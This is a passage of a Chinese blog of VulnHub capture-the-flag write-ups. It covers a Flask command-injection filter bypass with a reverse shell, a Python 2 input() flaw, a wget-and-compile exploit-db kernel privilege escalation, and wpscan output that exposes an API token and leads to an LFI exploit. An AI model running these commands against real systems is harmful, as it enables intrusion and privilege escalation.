class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> socket.timeout:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;timeout\n&quot;</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_exp</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="comment"># (8, &#x27;*&#x27;, 3)</span></span><br><span class="line">    arg1 = re.search(<span class="string">&quot;\((.), \&#x27;(.*)\&#x27;, (.)\)&quot;</span>, data).group(<span class="number">1</span>)</span><br><span class="line">    arg2 = re.search(<span class="string">&quot;\((.), \&#x27;(.*)\&#x27;, (.)\)&quot;</span>, data).group(<span class="number">3</span>)</span><br><span class="line">    act = re.search(<span class="string">&quot;\((.), \&#x27;(.*)\&#x27;, (.)\)&quot;</span>, data).group(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    exp = arg1 + act + arg2</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;expression: &quot;</span>, exp)</span><br><span class="line">    <span class="keyword">return</span> exp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">exp</span>):</span><br><span class="line">    rs = <span class="built_in">int</span>(<span class="built_in">eval</span>(exp))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rs: &quot;</span>, rs)</span><br><span class="line">    <span class="keyword">return</span> rs</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1002</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(i + <span class="number">1</span>), <span class="string">&quot;:&quot;</span>)</span><br><span class="line">    j = calc(get_exp(recv_data()))</span><br><span class="line">    s.sendall((<span class="built_in">str</span>(j) + <span class="string">&quot;\n&quot;</span>).encode())</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429235645931.png" alt="image-20230429235645931"></p>
<p>除此以外发现 ftp 可以匿名登录（Anonymous），直接登录下载文件。</p>
<p>扫描目录发现一个 wish 目录，尝试执行命令，发现有字符的过滤，用 burp 爆破一下看看哪些字符被过滤了。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230430112025731.png" alt="image-20230430112025731"></p>
<p>直接采取 echo 和 base64 联合执行命令的方式，反弹一个 shell。</p>
<p>查看一下 python 中 flask 框架写的 app.py，发现可疑的文件 &#x2F;home&#x2F;nitish&#x2F;.dev&#x2F;creds.txt，查看发现是用户的密码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect, render_template, request, url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&quot;key&quot;</span></span><br><span class="line">	</span><br><span class="line">CREDS = <span class="string">&quot;/home/nitish/.dev/creds.txt&quot;</span>		<span class="comment"># 可以的文件</span></span><br><span class="line"></span><br><span class="line">RCE = [<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;;&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="keyword">if</span> CREDS <span class="keyword">in</span> cmd <span class="keyword">and</span> <span class="string">&quot;cat&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> RCE:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> cmd:</span><br><span class="line">                <span class="keyword">if</span> i == j:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;main.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/wish&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wish</span>():</span><br><span class="line">    execute = request.form.get(<span class="string">&quot;cmd&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> execute:</span><br><span class="line">        <span class="keyword">if</span> validate(execute):</span><br><span class="line">            output = subprocess.Popen(execute, shell=<span class="literal">True</span>,</span><br><span class="line">                                      stdout=subprocess.PIPE).stdout.read()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output = <span class="string">&quot;Wrong choice of words&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;genie&quot;</span>, name=output))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;wish.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/genie&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genie</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        page = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">&quot;It&#x27;s not that hard&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;genie.html&#x27;</span>, file=page)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230430125846400.png" alt="image-20230430125846400"></p>
<p>发现 genie 具有特权，看一下这个命令。genie 是Systemd项目的一部分，它是一个使用Linux Namespaces技术来运行多个Systemd服务的工具。它允许用户在不影响主机命名空间的情况下，在单个系统上运行多个实例。</p>
<p>尝试根据提示来执行命令似乎发现不行。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230430132706112.png" alt="image-20230430132706112"></p>
<p>利用 man 命令来查看 genie 的手册，发现有其他的命令可以利用。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230430133116679.png" alt="image-20230430133116679"></p>
<p>发现 sam 用户也是有特权的，可以直接执行 &#x2F;root&#x2F;lago 这个文件。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230430133207566.png" alt="image-20230430133207566"></p>
<p>尝试利用其中的功能来读取文件，发现失败，净扯淡。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230430134046957.png" alt="image-20230430134046957"></p>
<p>根据wp找到 sam 用户下的一个 pyc 文件，功能似乎是和这个 lago 一样的，反编译后查看。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.9.0</span></span><br><span class="line"><span class="comment"># Python bytecode version base 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.10.5 (main, Jun  8 2022, 09:26:22) [GCC 11.3.0]</span></span><br><span class="line"><span class="comment"># Embedded file name: /home/mzfr/scripts/exp.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2019-11-07 21:05:18</span></span><br><span class="line"><span class="keyword">from</span> getpass <span class="keyword">import</span> getuser</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">naughtyboi</span>():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Working on it!! &#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guessit</span>():</span><br><span class="line">    num = randint(<span class="number">1</span>, <span class="number">101</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Choose a number between 1 to 100: &#x27;</span></span><br><span class="line">    s = <span class="built_in">input</span>(<span class="string">&#x27;Enter your number: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> s == num:</span><br><span class="line">        system(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Better Luck next time&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readfiles</span>():</span><br><span class="line">    user = getuser()</span><br><span class="line">    path = <span class="built_in">input</span>(<span class="string">&#x27;Enter the full of the file to read: &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;User %s is not allowed to read %s&#x27;</span> % (user, path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">options</span>():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;What do you want to do ?&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;1 - Be naughty&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;2 - Guess the number&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;3 - Read some damn files&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;4 - Work&#x27;</span></span><br><span class="line">    choice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Enter your choice: &#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> choice</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">op</span>):</span><br><span class="line">    <span class="keyword">if</span> op == <span class="number">1</span>:</span><br><span class="line">        naughtyboi()</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">2</span>:</span><br><span class="line">        guessit()</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">3</span>:</span><br><span class="line">        readfiles()</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;work your ass off!!&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Do something better with your life&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(options())</span><br></pre></td></tr></table></figure>

<p>在 python 中，虽然 input 函数接收命令行的数字输入时会将其自动识别为数字，但当其接收字符串输入时，必须将字符串框在引号中才能被其识别为字符串，否则当作变量处理。<strong>需要注意的是，只有 python2 有这个漏洞</strong>。</p>
<p>一个 demo：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="number">1</span></span><br><span class="line">s = <span class="built_in">input</span>(<span class="string">&#x27;input your ans: &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(s))</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="keyword">if</span> s == num:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;fail&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230430135842525.png" alt="image-20230430135842525"></p>
<h2 id="DOMDOM-1"><a href="#DOMDOM-1" class="headerlink" title="DOMDOM: 1"></a>DOMDOM: 1</h2><p>总结：记录一次利用工具根据操作系统版本号自动查找相应的提权脚本。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/domdom-1,328/">DomDom: 1 ~ VulnHub</a></p>
</blockquote>
<p>隐藏得很深的命令执行漏洞。。。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230502162604788.png" alt="image-20230502162604788"></p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/The-Z-Labs/linux-exploit-suggester">The-Z-Labs&#x2F;linux-exploit-suggester: Linux privilege escalation auditing tool (github.com)</a></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230502164140590.png" alt="image-20230502164140590"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/45010</span><br><span class="line">mv 45010 exp.c</span><br><span class="line">gcc exp.c -o exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>



<h2 id="HACKNOS-OS-HACKNOS-2-1"><a href="#HACKNOS-OS-HACKNOS-2-1" class="headerlink" title="HACKNOS: OS-HACKNOS-2.1"></a>HACKNOS: OS-HACKNOS-2.1</h2><p>总结：通过打点发现是一个 wordpress 搭建的博客平台，学习用 wpscan 来对 wordpress 进行安全测试；学习了利用 john 来对 MD5</p>
<p>加密密码的破解。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacknos-os-hacknos-2,403/">hackNos: Os-hackNos-2.1 ~ VulnHub</a></p>
</blockquote>
<p>关于 wpscan 的扫描结果：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">┌──(pursue㉿kali)-[~]</span><br><span class="line">└─$ wpscan --url http://192.168.126.140/tsweb/ -e vp --api-token O6XhjNaDK5lHZRHS3pAClDVW4cKD3wJssA84z0Mtjhk</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.22</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://192.168.126.140/tsweb/ [192.168.126.140]</span><br><span class="line">[+] Started: Tue May  2 19:42:08 2023</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://192.168.126.140/tsweb/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://192.168.126.140/tsweb/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://192.168.126.140/tsweb/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://192.168.126.140/tsweb/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.3.14 identified (Outdated, released on 2022-10-17).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://192.168.126.140/tsweb/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.3.14&lt;/generator&gt;</span><br><span class="line"> |  - http://192.168.126.140/tsweb/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.3.14&lt;/generator&gt;</span><br><span class="line"> |</span><br><span class="line"> | [!] 1 vulnerability identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP &lt;= 6.2 - Unauthenticated Blind SSRF via DNS Rebinding</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590</span><br><span class="line"> |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentytwenty</span><br><span class="line"> | Location: http://192.168.126.140/tsweb/wp-content/themes/twentytwenty/</span><br><span class="line"> | Last Updated: 2023-03-29T00:00:00.000Z</span><br><span class="line"> | Readme: http://192.168.126.140/tsweb/wp-content/themes/twentytwenty/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 2.2</span><br><span class="line"> | Style URL: http://192.168.126.140/tsweb/wp-content/themes/twentytwenty/style.css?ver=1.0</span><br><span class="line"> | Style Name: Twenty Twenty</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentytwenty/</span><br><span class="line"> | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.0 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://192.168.126.140/tsweb/wp-content/themes/twentytwenty/style.css?ver=1.0, Match: &#x27;Version: 1.0&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating Vulnerable Plugins (via Passive Methods)</span><br><span class="line">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] gracemedia-media-player</span><br><span class="line"> | Location: http://192.168.126.140/tsweb/wp-content/plugins/gracemedia-media-player/</span><br><span class="line"> | Latest Version: 1.0 (up to date)</span><br><span class="line"> | Last Updated: 2013-07-21T15:09:00.000Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | [!] 1 vulnerability identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: GraceMedia Media Player 1.0 - Local File Inclusion (LFI)</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/a4f5b10f-3386-45cc-9548-dd7bbea199d6</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9618</span><br><span class="line"> |      - https://www.exploit-db.com/exploits/46537/</span><br><span class="line"> |      - https://seclists.org/fulldisclosure/2019/Mar/26</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.0 (100% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.126.140/tsweb/wp-content/plugins/gracemedia-media-player/readme.txt</span><br><span class="line"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.126.140/tsweb/wp-content/plugins/gracemedia-media-player/readme.txt</span><br><span class="line"></span><br><span class="line">[+] WPScan DB API OK</span><br><span class="line"> | Plan: free</span><br><span class="line"> | Requests Done (during the scan): 3</span><br><span class="line"> | Requests Remaining: 72</span><br><span class="line"></span><br><span class="line">[+] Finished: Tue May  2 19:42:12 2023</span><br><span class="line">[+] Requests Done: 7</span><br><span class="line">[+] Cached Requests: 36</span><br><span class="line">[+] Data Sent: 1.711 KB</span><br><span class="line">[+] Data Received: 6.376 KB</span><br><span class="line">[+] Memory used: 234.535 MB</span><br><span class="line">[+] Elapsed time: 00:00:04</span><br></pre></td></tr></table></figure>

<ul>
<li>Headers：扫描器检测到正在运行的Web服务器是Apache&#x2F;2.4.29 (Ubuntu)，这是通过HTTP响应头中的Server字段得出的。</li>
<li>XML-RPC seems to be enabled：扫描器检测到XML-RPC功能已经启用。XML-RPC是远程过程调用协议，常用于WordPress站点之间的数据交换。这可能会导致安全问题，因此需要注意。</li>
<li>WordPress readme found：扫描器检测到WordPress站点上存在readme.html文件，这通常包含有关安装的版本和其他信息，可能会泄露站点的敏感信息。</li>
<li>Upload directory has listing enabled：扫描器检测到上传目录开启了列目录功能，这意味着攻击者可以直接访问该目录内的文件，其中可能包含站点的敏感信息。</li>
<li>The external WP-Cron seems to be enabled：扫描器检测到外部WP-Cron似乎已启用。WP-Cron是WordPress的计划任务系统，如果不正确地配置，可能会导致站点崩溃或遭受DDoS攻击。</li>
<li>WordPress version 5.3.14 identified：扫描器检测到WordPress的版本为5.3.14，该版本已经过时。报告还指出了该版本存在一个名为“WP &lt;&#x3D; 6.2 - Unauthenticated Blind SSRF via DNS Rebinding”的漏洞，因此建议升级到最新版本以避免安全问题。</li>
<li>WordPress theme in use：扫描器检测到正在使用的主题是twentytwenty，该主题的版本较旧，建议更新到最新版本以获得更好的安全性。</li>
<li>Enumerating Vulnerable Plugins：扫描器通过被动方法枚举可能存在的漏洞插件。</li>
<li>Checking Plugin Versions：扫描器通过被动和主动方法检查插件的版本，并发现一个名为“gracemedia-media-player”的插件存在本地文件包含漏洞（CVE-2019-9618）。</li>
<li>WPScan DB API OK：扫描器成功连接到WPScan数据库API，并使用3个请求进行了扫描。</li>
</ul>
<p>直接找到漏洞库：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/46537">WordPress Plugin GraceMedia Media Player 1.0 - Local File Inclusion - PHP webapps Exploit (exploit-db.com)</a></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230502195010952.png" alt="image-20230502195010952"></p>
